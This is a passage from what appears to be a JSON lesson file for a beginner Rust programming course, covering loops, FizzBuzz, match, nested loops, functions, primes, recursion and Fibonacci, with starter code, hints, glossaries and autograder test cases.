100","input":"100\n","expected":"A"},{"name":"score 95","input":"95\n","expected":"A"},{"name":"score 90","input":"90\n","expected":"A"},{"name":"score 89","input":"89\n","expected":"B"},{"name":"score 85","input":"85\n","expected":"B"},{"name":"score 80","input":"80\n","expected":"B"},{"name":"score 79","input":"79\n","expected":"C"},{"name":"score 75","input":"75\n","expected":"C"},{"name":"score 70","input":"70\n","expected":"C"},{"name":"score 69","input":"69\n","expected":"D"},{"name":"score 65","input":"65\n","expected":"D"},{"name":"score 60","input":"60\n","expected":"D"},{"name":"score 59","input":"59\n","expected":"F"},{"name":"score 30","input":"30\n","expected":"F"},{"name":"score 0","input":"0\n","expected":"F"},{"name":"score -5","input":"-5\n","expected":"F"}],"usesInput":true,"hasHarness":false},{"id":"loop-break","number":"3.3","title":"loop and break","content":"## Repeating code\n\nA **loop** repeats a block of code again and again. Each time through the block is called an **iteration** (one lap around a running track). The simplest loop is the keyword ^loop^: it repeats forever, like a song on repeat, until something tells it to stop. That something is **break**, which immediately jumps out of the loop. Another keyword, **continue**, skips the rest of the current iteration and goes straight to the next one.\n\nA loop usually needs a **counter**: a variable that changes every iteration so the loop can notice when to stop. For that the variable must be **mutable** (changeable), written ^let mut^. The shortcut ^i += 1^ means \"add 1 to i\".\n\n~~~\nfn main() {\n    let mut i = 0;\n    loop {\n        i += 1;\n        if i == 3 {\n            continue;\n        }\n        if i > 5 {\n            break;\n        }\n        println!(\"{}\", i);\n    }\n}\n~~~\n\n- ^let mut i = 0;^ creates a changeable counter starting at 0.\n- ^loop {^ begins the endless loop.\n- ^i += 1;^ adds 1 to i. It becomes 1, then 2, then 3...\n- ^if i == 3 { continue; }^ when i is 3, skip the print and start the next lap.\n- ^if i > 5 { break; }^ when i reaches 6, leave the loop for good.\n- ^println!(\"{}\", i);^ prints the counter on laps that were not skipped.\n\nOutput:\n\n~~~\n1\n2\n4\n5\n~~~\n\nThe 3 is missing because of ^continue^. If you forget ^break^, the loop never ends (an **infinite loop**), and the program has to be stopped by force.\n\n## Try it\n\nChange ^i == 3^ to ^i == 2^ and see which number disappears. Change ^i > 5^ to ^i > 8^ to count higher.\n\n## Your task\n\nUsing a ^loop^ and ^break^, print the numbers 1 to 5, one per line. The starter has a counter ^i^ starting at 1 already. Inside the loop: if i is greater than 5, break; otherwise print i and add 1 to it. Expected output:\n\n~~~\n1\n2\n3\n4\n5\n~~~","starter":"fn main() {\n    let mut i = 1;\n\n}\n","hint":"Inside loop: break when i > 5, otherwise print and increment.","terms":[{"term":"loop","def":"A block of code that repeats; the keyword loop repeats forever until a break."},{"term":"iteration","def":"One run through the body of a loop."},{"term":"break","def":"Leaves the loop immediately."},{"term":"continue","def":"Skips the rest of this iteration and starts the next one."},{"term":"counter","def":"A variable that changes each iteration to track progress."},{"term":"mut","def":"Makes a variable changeable."},{"term":"+=","def":"Adds a number to a variable (i += 1 means i = i + 1)."}],"image":{"url":"/diagrams/rust/loop-break.svg","caption":"Visual diagram: loop and break"},"isUnitTest":false,"fileName":"main.rs","tests":[{"name":"prints 1 to 5","input":"","expected":"1\n2\n3\n4\n5"}],"usesInput":false,"hasHarness":false},{"id":"while-loops","number":"3.4","title":"while Loops","content":"## Looping while something is true\n\nA **while loop** repeats its block as long as a condition (a true/false question) stays true. Before every iteration (one run through the block) Rust re-checks the condition. When it turns false, the loop ends by itself, with no ^break^ needed. Think of \"while the kettle is not boiling, keep waiting\".\n\nIf the condition is false the very first time, the block never runs at all. And you must change something inside the loop that eventually makes the condition false, or it will run forever.\n\n~~~\nfn main() {\n    let mut count = 0;\n    while count < 3 {\n        println!(\"count is {}\", count);\n        count += 1;\n    }\n    println!(\"done\");\n}\n~~~\n\n- ^let mut count = 0;^ creates a changeable counter (^mut^ means mutable, changeable).\n- ^while count < 3 {^ checks: is count less than 3? Yes, so enter the block.\n- ^println!(\"count is {}\", count);^ prints the current value.\n- ^count += 1;^ adds 1. After this, Rust goes back and checks the condition again.\n- When count reaches 3, ^count < 3^ is false and the loop ends.\n- ^println!(\"done\");^ is after the loop, so it runs once at the end.\n\nOutput:\n\n~~~\ncount is 0\ncount is 1\ncount is 2\ndone\n~~~\n\nUse ^-=^ to subtract: ^n -= 1^ means \"make n one smaller\", handy for counting down.\n\n## Try it\n\nChange ^count < 3^ to ^count < 6^. Then change the starting value to 10 and see that nothing from the loop prints.\n\n## Your task\n\nPrint a countdown from 5 to 1, one number per line, then print ^Liftoff!^. Use a ^while^ loop; the starter has ^n^ set to 5. Expected output:\n\n~~~\n5\n4\n3\n2\n1\nLiftoff!\n~~~","starter":"fn main() {\n    let mut n = 5;\n\n}\n","hint":"while n > 0 { print; n -= 1; } then print Liftoff!","terms":[{"term":"while","def":"A loop that repeats as long as its condition is true."},{"term":"condition","def":"A true/false question checked before each iteration."},{"term":"iteration","def":"One run through the loop body."},{"term":"mutable (mut)","def":"A variable that is allowed to change."},{"term":"-=","def":"Subtracts a number from a variable (n -= 1 means n = n - 1)."},{"term":"infinite loop","def":"A loop whose condition never becomes false, so it never stops."}],"image":{"url":"/diagrams/rust/while-loops.svg","caption":"Visual diagram: while Loops"},"isUnitTest":false,"fileName":"main.rs","tests":[{"name":"countdown then Liftoff","input":"","expected":"5\n4\n3\n2\n1\nLiftoff!"}],"usesInput":false,"hasHarness":false},{"id":"for-ranges","number":"3.5","title":"for Loops & Ranges","content":"## Counting with for\n\nWhen you know how many times to repeat, a **for loop** is neatest. It takes each item from a collection of values, one at a time, and puts it in a variable for you. No manual counter is needed. Going through values one by one is called **iterating**.\n\nA **range** is a sequence of whole numbers written with two dots. ^1..4^ means 1, 2, 3 (it stops just before the end number, like \"up to but not including\"). ^1..=4^ with an equals sign includes the end: 1, 2, 3, 4. Calling ^.rev()^ on a range (in parentheses) runs it **in reverse**.\n\n~~~\nfn main() {\n    let mut total = 0;\n    for i in 1..=4 {\n        println!(\"i is {}\", i);\n        total += i;\n    }\n    println!(\"total is {}\", total);\n}\n~~~\n\n- ^let mut total = 0;^ makes a changeable variable to collect a running sum, an **accumulator** (like a piggy bank you keep adding to).\n- ^for i in 1..=4 {^ runs the block four times; i is 1, then 2, 3, 4. The variable ^i^ is created by the loop itself.\n- ^println!(\"i is {}\", i);^ prints each value.\n- ^total += i;^ adds the current i to the total.\n- After the loop, ^total^ holds 1 + 2 + 3 + 4 = 10.\n\nOutput:\n\n~~~\ni is 1\ni is 2\ni is 3\ni is 4\ntotal is 10\n~~~\n\nOther forms: ^for i in 1..4^ gives 1, 2, 3; ^for i in (1..=3).rev()^ gives 3, 2, 1.\n\n## Try it\n\nRemove the ^=^ from ^1..=4^ and see the total change to 6. Then try ^(1..=4).rev()^ to print in reverse.\n\n## Your task\n\nRead ^n^ (the starter does this) and print the sum 1 + 2 + ... + n, using a ^for^ loop with an accumulator. For input ^5^ print:\n\n~~~\n15\n~~~\n\nFor input ^0^ the range is empty, so the answer is ^0^.","starter":"use std::io;\n\nfn main() {\n    let mut line = String::new();\n    io::stdin().read_line(&mut line).unwrap();\n    let n: i32 = line.trim().parse().unwrap();\n\n}\n","hint":"let mut sum = 0; for i in 1..=n { sum += i; }","terms":[{"term":"for loop","def":"A loop that takes values one at a time from a range or collection."},{"term":"range","def":"A sequence of whole numbers like 1..5 (excludes 5) or 1..=5 (includes 5)."},{"term":"iterate","def":"To go through values one by one."},{"term":"accumulator","def":"A variable that collects a running total as a loop goes."},{"term":"..  and ..=","def":"Range operators: .. stops before the end number, ..= includes it."},{"term":"rev()","def":"Makes a range go backwards."},{"term":"in","def":"Keyword in a for loop that names where the values come from."}],"image":{"url":"/diagrams/rust/for-ranges.svg","caption":"Visual diagram: for Loops & Ranges"},"isUnitTest":false,"fileName":"main.rs","tests":[{"name":"sum to 1","input":"1\n","expected":"1"},{"name":"sum to 2","input":"2\n","expected":"3"},{"name":"sum to 5","input":"5\n","expected":"15"},{"name":"sum to 10","input":"10\n","expected":"55"},{"name":"sum to 100","input":"100\n","expected":"5050"},{"name":"sum to 1000","input":"1000\n","expected":"500500"},{"name":"sum to 0","input":"0\n","expected":"0"},{"name":"sum to -4","input":"-4\n","expected":"0"}],"usesInput":true,"hasHarness":false},{"id":"fizzbuzz","number":"3.6","title":"FizzBuzz","content":"## A famous puzzle\n\nFizzBuzz is a classic exercise used to check that you can combine loops and conditions. First you need the **remainder operator** ^%^. It gives what is left over after division. ^7 % 3^ is 1 (3 fits twice, 6, leaving 1). If ^a % b == 0^ there is nothing left over, so a is **divisible** by b (it divides evenly).\n\n~~~\nfn main() {\n    for i in 1..=6 {\n        if i % 2 == 0 {\n            println!(\"{} is even\", i);\n        } else {\n            println!(\"{} is odd\", i);\n        }\n    }\n}\n~~~\n\n- ^for i in 1..=6^ repeats for i = 1 to 6 (inclusive range).\n- ^i % 2 == 0^ asks: is the remainder after dividing by 2 equal to zero? That is true for even numbers.\n- The if prints \"even\" in that case; the else branch handles the rest.\n\nOutput:\n\n~~~\n1 is odd\n2 is even\n3 is odd\n4 is even\n5 is odd\n6 is even\n~~~\n\nAn important idea is **order**: in an ^if / else if^ chain only the first true branch runs. If a number fits several rules, put the most specific rule first.\n\n## Try it\n\nChange ^% 2^ to ^% 3^ and the words to \"multiple of 3\" / \"not\". See which numbers match.\n\n## Your task\n\nRead ^n^. For each number from 1 to n, print one line:\n\n- ^FizzBuzz^ if divisible by both 3 and 5 (that means divisible by 15), checked **first**\n- ^Fizz^ if divisible by 3\n- ^Buzz^ if divisible by 5\n- otherwise the number itself\n\nFor input ^5^:\n\n~~~\n1\n2\nFizz\n4\nBuzz\n~~~","starter":"use std::io;\n\nfn main() {\n    let mut line = String::new();\n    io::stdin().read_line(&mut line).unwrap();\n    let n: i32 = line.trim().parse().unwrap();\n\n}\n","hint":"i % 15 == 0 is the FizzBuzz case.","terms":[{"term":"%","def":"The remainder operator: what is left after dividing (7 % 3 is 1)."},{"term":"divisible","def":"Divides evenly with remainder 0."},{"term":"for loop","def":"Repeats once for each number in a range."},{"term":"else if chain","def":"Several conditions checked in order; only the first true one runs."},{"term":"1..=n","def":"A range from 1 up to and including n."}],"image":{"url":"/diagrams/rust/fizzbuzz.svg","caption":"Visual diagram: FizzBuzz"},"isUnitTest":false,"fileName":"main.rs","tests":[{"name":"up to 15","input":"15\n","expected":"1\n2\nFizz\n4\nBuzz\nFizz\n7\n8\nFizz\nBuzz\n11\nFizz\n13\n14\nFizzBuzz"},{"name":"up to 3","input":"3\n","expected":"1\n2\nFizz"},{"name":"up to 1","input":"1\n","expected":"1"},{"name":"up to 5","input":"5\n","expected":"1\n2\nFizz\n4\nBuzz"},{"name":"up to 30","input":"30\n","expected":"1\n2\nFizz\n4\nBuzz\nFizz\n7\n8\nFizz\nBuzz\n11\nFizz\n13\n14\nFizzBuzz\n16\n17\nFizz\n19\nBuzz\nFizz\n22\n23\nFizz\nBuzz\n26\nFizz\n28\n29\nFizzBuzz"},{"name":"up to 100","input":"100\n","expected":"1\n2\nFizz\n4\nBuzz\nFizz\n7\n8\nFizz\nBuzz\n11\nFizz\n13\n14\nFizzBuzz\n16\n17\nFizz\n19\nBuzz\nFizz\n22\n23\nFizz\nBuzz\n26\nFizz\n28\n29\nFizzBuzz\n31\n32\nFizz\n34\nBuzz\nFizz\n37\n38\nFizz\nBuzz\n41\nFizz\n43\n44\nFizzBuzz\n46\n47\nFizz\n49\nBuzz\nFizz\n52\n53\nFizz\nBuzz\n56\nFizz\n58\n59\nFizzBuzz\n61\n62\nFizz\n64\nBuzz\nFizz\n67\n68\nFizz\nBuzz\n71\nFizz\n73\n74\nFizzBuzz\n76\n77\nFizz\n79\nBuzz\nFizz\n82\n83\nFizz\nBuzz\n86\nFizz\n88\n89\nFizzBuzz\n91\n92\nFizz\n94\nBuzz\nFizz\n97\n98\nFizz\nBuzz"},{"name":"up to 14","input":"14\n","expected":"1\n2\nFizz\n4\nBuzz\nFizz\n7\n8\nFizz\nBuzz\n11\nFizz\n13\n14"}],"usesInput":true,"hasHarness":false},{"id":"match-expressions","number":"3.7","title":"match","content":"## Choosing between many options\n\nWhen you compare one value against many possibilities, a long else-if chain gets messy. **match** is tidier. You give it a value, then a list of **arms**. Each arm has a **pattern** (a shape the value is compared with) and, after ^=>^, the code to run when it fits. Rust tries arms from top to bottom and runs the first that matches. Think of sorting mail into pigeonholes.\n\nRust demands that match is **exhaustive**: it must cover every possible value. The pattern ^_^ (underscore) is the **catch-all**: it matches anything not already handled. You can also write ^2 | 3^ (either value) and ranges like ^4..=9^.\n\n~~~\nfn main() {\n    let n = 3;\n    match n {\n        1 => println!(\"one\"),\n        2 | 3 => println!(\"two or three\"),\n        4..=9 => println!(\"four to nine\"),\n        _ => println!(\"something else\"),\n    }\n}\n~~~\n\n- ^match n {^ starts comparing the value in n against the arms.\n- ^1 => println!(\"one\"),^ pattern 1; if n is 1 print \"one\". Arms end with a comma.\n- ^2 | 3 =>^ matches 2 or 3. Here n is 3, so this arm runs.\n- ^4..=9 =>^ matches any number from 4 through 9.\n- ^_ =>^ catches everything else, such as 0 or 100.\n- Only one arm runs, so only one line prints.\n\nOutput:\n\n~~~\ntwo or three\n~~~\n\nLike ^if^, ^match^ is an expression and can give a value: ^let name = match n { 1 => \"one\", _ => \"other\" };^\n\n## Try it\n\nChange ^let n = 3;^ to 7, then 1, then 50 and predict the output each time.\n\n## Your task\n\nRead a number (the starter gives you ^n^). Use ^match^ to print the weekday name: 1 = Monday, 2 = Tuesday, 3 = Wednesday, 4 = Thursday, 5 = Friday, 6 = Saturday, 7 = Sunday. Any other number prints ^invalid^. For input ^3^:\n\n~~~\nWednesday\n~~~","starter":"use std::io;\n\nfn main() {\n    let mut line = String::new();\n    io::stdin().read_line(&mut line).unwrap();\n    let n: i32 = line.trim().parse().unwrap();\n\n}\n","hint":"match n { 1 => println!(\"Monday\"), ... _ => println!(\"invalid\") }","terms":[{"term":"match","def":"Compares a value against a list of patterns and runs the first arm that fits."},{"term":"pattern","def":"A shape a value is compared against, like 1, 2 | 3, or 4..=9."},{"term":"arm","def":"One pattern plus its code, written pattern => code."},{"term":"=>","def":"Separates a pattern from the code to run."},{"term":"_","def":"The catch-all pattern that matches any value."},{"term":"|","def":"Inside a pattern, means \"or\"."},{"term":"exhaustive","def":"Covering every possible value, which Rust requires of match."}],"image":{"url":"/diagrams/rust/match-expressions.svg","caption":"Visual diagram: match"},"isUnitTest":false,"fileName":"main.rs","tests":[{"name":"day 1","input":"1\n","expected":"Monday"},{"name":"day 2","input":"2\n","expected":"Tuesday"},{"name":"day 3","input":"3\n","expected":"Wednesday"},{"name":"day 4","input":"4\n","expected":"Thursday"},{"name":"day 5","input":"5\n","expected":"Friday"},{"name":"day 6","input":"6\n","expected":"Saturday"},{"name":"day 7","input":"7\n","expected":"Sunday"},{"name":"day 0","input":"0\n","expected":"invalid"},{"name":"day 8","input":"8\n","expected":"invalid"},{"name":"day -1","input":"-1\n","expected":"invalid"},{"name":"day 100","input":"100\n","expected":"invalid"}],"usesInput":true,"hasHarness":false},{"id":"nested-loops","number":"3.8","title":"Nested Loops","content":"## Loops inside loops\n\n**Nested** means placed inside another. A **nested loop** is a loop inside a loop. Think of a clock: for each hour (outer loop) the minute hand goes round fully (inner loop). The inner loop runs completely every time the outer one does one iteration (one lap).\n\nTwo helpers: ^print!^ prints without moving to a new line, so output stays on the same line. ^println!()^ with nothing inside just ends the current line. A name like ^_^ for the loop variable means \"I don't need this value\".\n\n~~~\nfn main() {\n    for row in 1..=3 {\n        for _ in 0..row {\n            print!(\"*\");\n        }\n        println!();\n    }\n}\n~~~\n\n- ^for row in 1..=3^ is the outer loop; row is 1, then 2, then 3.\n- ^for _ in 0..row^ is the inner loop. ^0..row^ is a range holding exactly row numbers, so it repeats row times. We use ^_^ because we do not need the value.\n- ^print!(\"*\");^ draws one star without a new line.\n- ^println!();^ runs after the inner loop finishes, ending the row.\n- Row 1 gets one star, row 2 two stars, row 3 three.\n\nOutput:\n\n~~~\n*\n**\n***\n~~~\n\n## Try it\n\nChange the star to another character, or change ^1..=3^ to ^1..=5^ for a bigger triangle.\n\n## Your task\n\nRead ^n^ (provided). Print a right triangle made of ^#^ characters with n rows: row 1 has one ^#^, row 2 has two, and so on. For input ^3^:\n\n~~~\n#\n##\n###\n~~~","starter":"use std::io;\n\nfn main() {\n    let mut line = String::new();\n    io::stdin().read_line(&mut line).unwrap();\n    let n: i32 = line.trim().parse().unwrap();\n\n}\n","hint":"Outer loop over rows; inner loop prints \"#\" row times; then println!().","terms":[{"term":"nested loop","def":"A loop placed inside another loop."},{"term":"outer / inner loop","def":"The outside loop and the loop inside it; the inner one runs fully for each outer iteration."},{"term":"print!","def":"Prints text without ending the line."},{"term":"println!()","def":"With nothing inside, just ends the current line."},{"term":"_","def":"A loop variable name meaning the value is not needed."},{"term":"0..row","def":"A range that repeats exactly row times."}],"image":{"url":"/diagrams/rust/nested-loops.svg","caption":"Visual diagram: Nested Loops"},"isUnitTest":true,"fileName":"main.rs","tests":[{"name":"1 rows","input":"1\n","expected":"#"},{"name":"2 rows","input":"2\n","expected":"#\n##"},{"name":"3 rows","input":"3\n","expected":"#\n##\n###"},{"name":"5 rows","input":"5\n","expected":"#\n##\n###\n####\n#####"},{"name":"8 rows","input":"8\n","expected":"#\n##\n###\n####\n#####\n######\n#######\n########"},{"name":"12 rows","input":"12\n","expected":"#\n##\n###\n####\n#####\n######\n#######\n########\n#########\n##########\n###########\n############"}],"usesInput":true,"hasHarness":false}]},{"id":"functions","title":"Functions","lessons":[{"id":"fn-square","number":"4.1","title":"Writing Functions","content":"## What is a function?\n\nA **function** is a named, reusable recipe: a bundle of instructions that you write once and can run (the programmer's word is **call**) as many times as you like. Think of a juice machine: you drop fruit in, it does its steps, and juice comes out. You don't rebuild the machine each time.\n\nIn Rust a function starts with the keyword ^fn^ (a **keyword** is a word with a special built-in meaning). Between parentheses you list the **parameters**: named slots the function fills in with the values you hand it. Each parameter needs a **type** (the kind of data it holds, like ^i32^, a whole number that can be negative). After ^->^ you write the **return type**: the type of the **return value**, which is the answer the function hands back to whoever called it.\n\n~~~\nfn add(a: i32, b: i32) -> i32 {\n    a + b\n}\n\nfn main() {\n    let total = add(2, 3);\n    println!(\"{}\", total);\n}\n~~~\n\n- ^fn add(a: i32, b: i32) -> i32 {^ defines a function named ^add^ with two parameters, both ^i32^, that returns an ^i32^. The ^{^ opens the function's **body** (the instructions inside).\n- ^a + b^ is an **expression**: a piece of code that works out to a value. It has no semicolon, so Rust treats it as the value to return.\n- ^}^ ends the body.\n- ^fn main() {^ is the special function where every program starts.\n- ^add(2, 3)^ calls ^add^. The values ^2^ and ^3^ are the **arguments** (the actual values you pass in); they fill the parameters ^a^ and ^b^.\n- ^let total = ...^ stores the returned value in a variable called ^total^.\n- ^println!(\"{}\", total);^ prints it.\n\nOutput:\n\n~~~\n5\n~~~\n\nKey rule: the last expression **without a semicolon** is the return value. Adding a semicolon turns it into a statement (an instruction that produces no value), and Rust will complain. You can also write ^return a + b;^ explicitly.\n\nFrom here on, the autograder supplies ^main^ for you and calls your function with several inputs. Don't write your own ^main^.\n\n## Try it\n\nChange ^a + b^ to ^a * b^ and run the example in your head (or in a scratch program): what prints now? Then add a semicolon after the expression and read the compiler's error message.\n\n## Your task\n\nImplement ^square^ so it returns ^x * x^. For example ^square(4)^ is ^16^, ^square(-3)^ is ^9^ and ^square(0)^ is ^0^.","starter":"fn square(x: i32) -> i32 {\n    // TODO\n    todo!()\n}\n","hint":"Return x * x with no semicolon.","terms":[{"term":"function","def":"A named, reusable block of code that you can call whenever you need it."},{"term":"fn","def":"The keyword that starts a function definition."},{"term":"parameter","def":"A named slot in a function that is filled with the value you pass in."},{"term":"argument","def":"The actual value you give a function when you call it."},{"term":"return value","def":"The answer a function hands back to its caller."},{"term":"->","def":"Written before the return type to say what type the function gives back."},{"term":"expression","def":"Code that works out to a value, like a + b."}],"image":{"url":"/diagrams/rust/fn-square.svg","caption":"Visual diagram: Writing Functions"},"isUnitTest":false,"fileName":"main.rs","tests":[{"name":"positive","input":"4\n","expected":"16"},{"name":"negative","input":"-3\n","expected":"9"},{"name":"zero","input":"0\n","expected":"0"},{"name":"large","input":"46340\n","expected":"2147395600"},{"name":"several numbers","input":"1 2 3 10\n","expected":"1\n4\n9\n100"}],"usesInput":true,"hasHarness":true},{"id":"fn-max3","number":"4.2","title":"Several Parameters","content":"## More than one input\n\nA function can have any number of **parameters**, separated by commas. Inside the function you can make decisions with ^if^ (run code only when a **condition**, a question with a true/false answer, is true). Remember that ^if ... else ...^ is itself an **expression** (code that produces a value), so it can be the function's return value.\n\n~~~\nfn bigger(a: i32, b: i32) -> i32 {\n    if a > b { a } else { b }\n}\n\nfn main() {\n    println!(\"{}\", bigger(3, 8));\n    println!(\"{}\", bigger(-1, -7));\n}\n~~~\n\n- ^fn bigger(a: i32, b: i32) -> i32^ takes two numbers and gives one back.\n- ^if a > b { a } else { b }^ checks whether ^a^ is greater (^>^). If so the whole ^if^ becomes ^a^, otherwise ^b^. No semicolons, so it is the return value.\n- ^bigger(3, 8)^ passes ^3^ and ^8^ as **arguments** (values handed in), in the same order as the parameters.\n- ^bigger(-1, -7)^ shows negatives work too; ^-1^ is bigger than ^-7^.\n\nOutput:\n\n~~~\n8\n-1\n~~~\n\nAnother handy idea is a **running maximum**: a variable that holds the biggest value seen so far. Declare it with ^let mut^ (a **mutable** variable can be changed later) and update it with ^=^ whenever you see something bigger.\n\n## Try it\n\nChange ^>^ to ^<^ in ^bigger^. It now returns the smaller number. Which output lines change?\n\n## Your task\n\nWrite ^max_of_three(a, b, c)^ taking three ^i32^ values and returning the largest. For example ^max_of_three(1, 2, 3)^ is ^3^ and ^max_of_three(-5, -2, -9)^ is ^-2^.","starter":"fn max_of_three(a: i32, b: i32, c: i32) -> i32 {\n    todo!()\n}\n","hint":"Keep a running maximum, or nest two comparisons.","terms":[{"term":"parameter","def":"A named input slot of a function; a function may have several, separated by commas."},{"term":"condition","def":"A true-or-false question, like a > b, that if uses to decide."},{"term":"if / else","def":"Runs one branch of code or another depending on a condition; it also produces a value."},{"term":">","def":"Greater-than comparison; gives true or false."},{"term":"let mut","def":"Creates a variable whose value is allowed to change later."},{"term":"running maximum","def":"A variable holding the biggest value seen so far, updated as you check more values."}],"image":{"url":"/diagrams/rust/fn-max3.svg","caption":"Visual diagram: Several Parameters"},"isUnitTest":false,"fileName":"main.rs","tests":[{"name":"ascending","input":"1 2 3\n","expected":"3"},{"name":"first is biggest","input":"9 2 3\n","expected":"9"},{"name":"middle is biggest","input":"4 8 3\n","expected":"8"},{"name":"all negative","input":"-5 -2 -9\n","expected":"-2"},{"name":"all equal","input":"7 7 7\n","expected":"7"},{"name":"extremes","input":"2147483647 0 -2147483648\n","expected":"2147483647"},{"name":"several lines","input":"1 5 2\n-1 -1 -2\n0 0 0\n","expected":"5\n-1\n0"}],"usesInput":true,"hasHarness":true},{"id":"fn-is-prime","number":"4.3","title":"Returning bool","content":"## Yes/no functions\n\nA **bool** (short for Boolean) is a type with only two values: ^true^ and ^false^. A function that answers a yes/no question returns a ^bool^, and by convention its name starts with ^is_^. Comparisons like ^==^ (\"is equal to\") produce a ^bool^.\n\nThe **remainder operator** ^%^ gives what is left over after division: ^7 % 2^ is ^1^, and ^8 % 2^ is ^0^. A number is **divisible** by another when the remainder is ^0^.\n\nSometimes you know the answer early. The keyword ^return^ leaves the function immediately with a value.\n\n~~~\nfn is_even(n: u32) -> bool {\n    n % 2 == 0\n}\n\nfn has_small_factor(n: u32) -> bool {\n    let mut d = 2;\n    while d < n {\n        if n % d == 0 {\n            return true;\n        }\n        d += 1;\n    }\n    false\n}\n\nfn main() {\n    println!(\"{}\", is_even(10));\n    println!(\"{}\", is_even(7));\n    println!(\"{}\", has_small_factor(9));\n    println!(\"{}\", has_small_factor(7));\n}\n~~~\n\n- ^is_even^ takes a ^u32^ (an **unsigned** integer: whole number, never negative) and returns whether ^n % 2^ equals ^0^.\n- ^let mut d = 2;^ starts a counter at 2.\n- ^while d < n {^ is a **loop**: it repeats its body as long as the condition is true.\n- ^if n % d == 0 { return true; }^ leaves right away if ^d^ divides ^n^ evenly.\n- ^d += 1;^ adds one to ^d^ so the next pass tries the next number.\n- ^false^ on the last line is the answer if the loop finished without finding a divisor.\n\nOutput:\n\n~~~\ntrue\nfalse\ntrue\nfalse\n~~~\n\n## Try it\n\nChange ^has_small_factor(9)^ to ^has_small_factor(11)^. What do you expect, and why?\n\n## Your task\n\nWrite ^is_prime(n: u32) -> bool^. A **prime** is a number greater than 1 that is divisible only by 1 and itself. 0 and 1 are not prime. So ^is_prime(2)^, ^is_prime(17)^ are ^true^; ^is_prime(0)^, ^is_prime(1)^, ^is_prime(100)^ are ^false^.\n\nTip: you only need to try divisors ^d^ while ^d * d <= n^, since a bigger divisor would pair with a smaller one you've already tried.","starter":"fn is_prime(n: u32) -> bool {\n    todo!()\n}\n","hint":"Try every divisor from 2 while d * d <= n.","terms":[{"term":"bool","def":"A type with only two values, true and false."},{"term":"%","def":"The remainder operator: what is left after dividing (7 % 2 is 1)."},{"term":"==","def":"Comparison that asks whether two values are equal; gives a bool."},{"term":"return","def":"Leaves the function immediately, handing back a value."},{"term":"while","def":"A loop that repeats its body as long as its condition is true."},{"term":"u32","def":"An unsigned (never negative) whole-number type."},{"term":"prime","def":"A number greater than 1 divisible only by 1 and itself."}],"image":{"url":"/diagrams/rust/fn-is-prime.svg","caption":"Visual diagram: Returning bool"},"isUnitTest":false,"fileName":"main.rs","tests":[{"name":"zero and one","input":"0\n1\n","expected":"0 false\n1 false"},{"name":"two and three","input":"2\n3\n","expected":"2 true\n3 true"},{"name":"small composite","input":"4\n18\n100\n","expected":"4 false\n18 false\n100 false"},{"name":"primes","input":"17\n97\n7919\n","expected":"17 true\n97 true\n7919 true"},{"name":"perfect square","input":"65536\n","expected":"65536 false"},{"name":"large prime","input":"2147483647\n","expected":"2147483647 true"}],"usesInput":true,"hasHarness":true},{"id":"fn-factorial","number":"4.4","title":"Recursion","content":"## Functions calling themselves\n\n**Recursion** means a function calls itself to solve a smaller piece of the same problem. Picture a set of nesting dolls: to count them, open one, then count the dolls inside it, which is the same job again, only smaller.\n\nEvery recursive function needs a **base case**: a situation simple enough to answer directly, which stops the chain. Without one, the function would call itself forever.\n\n~~~\nfn countdown(n: u32) {\n    if n == 0 {\n        println!(\"liftoff\");\n        return;\n    }\n    println!(\"{}\", n);\n    countdown(n - 1);\n}\n\nfn main() {\n    countdown(3);\n}\n~~~\n\n- ^fn countdown(n: u32)^ has no ^->^, so it returns nothing useful (it only prints).\n- ^if n == 0 {^ is the base case: stop counting.\n- ^println!(\"liftoff\"); return;^ prints and leaves the function, so no more calls are made.\n- ^println!(\"{}\", n);^ prints the current number.\n- ^countdown(n - 1);^ is the **recursive call**: the same function with a smaller number, getting closer to the base case.\n\nOutput:\n\n~~~\n3\n2\n1\nliftoff\n~~~\n\nThe **factorial** of n, written ^n!^, is ^n * (n-1) * ... * 1^. So ^5! = 120^. It fits recursion naturally: ^0! = 1^ (base case) and ^n! = n * (n-1)!^.\n\n## Try it\n\nChange ^countdown(3)^ to ^countdown(5)^ and predict the output before running.\n\n## Your task\n\nWrite ^factorial(n: u64) -> u64^ **recursively** (it must call itself). ^u64^ is an unsigned 64-bit whole number, big enough for ^20!^. Examples: ^factorial(0)^ is ^1^, ^factorial(5)^ is ^120^, ^factorial(10)^ is ^3628800^.","starter":"fn factorial(n: u64) -> u64 {\n    todo!()\n}\n","hint":"Base case n == 0 returns 1; otherwise n * factorial(n - 1).","terms":[{"term":"recursion","def":"A function calling itself to solve a smaller version of the same problem."},{"term":"base case","def":"The simple situation that is answered directly and stops the recursion."},{"term":"recursive call","def":"The line where a function calls itself."},{"term":"factorial","def":"n! is n multiplied by every whole number below it down to 1; 0! is 1."},{"term":"u64","def":"An unsigned 64-bit whole-number type that holds very large values."}],"image":{"url":"/diagrams/rust/fn-factorial.svg","caption":"Visual diagram: Recursion"},"isUnitTest":false,"fileName":"main.rs","tests":[{"name":"zero","input":"0\n","expected":"1"},{"name":"one","input":"1\n","expected":"1"},{"name":"five","input":"5\n","expected":"120"},{"name":"ten","input":"10\n","expected":"3628800"},{"name":"twenty (largest that fits)","input":"20\n","expected":"2432902008176640000"},{"name":"several","input":"3\n4\n6\n","expected":"6\n24\n720"}],"usesInput":true,"hasHarness":true},{"id":"fn-fibonacci","number":"4.5","title":"Fibonacci","content":"## A famous sequence\n\nThe **Fibonacci sequence** is 0, 1, 1, 2, 3, 5, 8, 13, ... where each number is the sum of the two before it. We write ^fib(0) = 0^ and ^fib(1) = 1^.\n\nRecursion (a function calling itself) works but is slow here, because it recomputes the same values again and again. A **loop** (code that repeats) is much faster: keep just the last two numbers and slide forward.\n\nA **tuple** is a small fixed group of values written in parentheses, like ^(0, 1)^. You can unpack one into several variables in one go: ^let (mut a, mut b) = (0u64, 1u64);^. The ^u64^ suffix on a number says \"this is a u64\".\n\n~~~\nfn main() {\n    let (mut a, mut b) = (0u64, 1u64);\n    for _ in 0..5 {\n        println!(\"{}\", a);\n        let next = a + b;\n        a = b;\n        b = next;\n    }\n}\n~~~\n\n- ^let (mut a, mut b) = (0u64, 1u64);^ makes two changeable variables: ^a = 0^, ^b = 1^.\n- ^for _ in 0..5 {^ repeats 5 times. ^0..5^ is a **range** (0,1,2,3,4); ^_^ means \"I don't need the counter's value\".\n- ^println!(\"{}\", a);^ prints the current Fibonacci number.\n- ^let next = a + b;^ computes the following number and stores it temporarily.\n- ^a = b;^ shifts the window: the old second number becomes the first.\n- ^b = next;^ the new number becomes the second.\n\nOutput:\n\n~~~\n0\n1\n1\n2\n3\n~~~\n\n## Try it\n\nChange 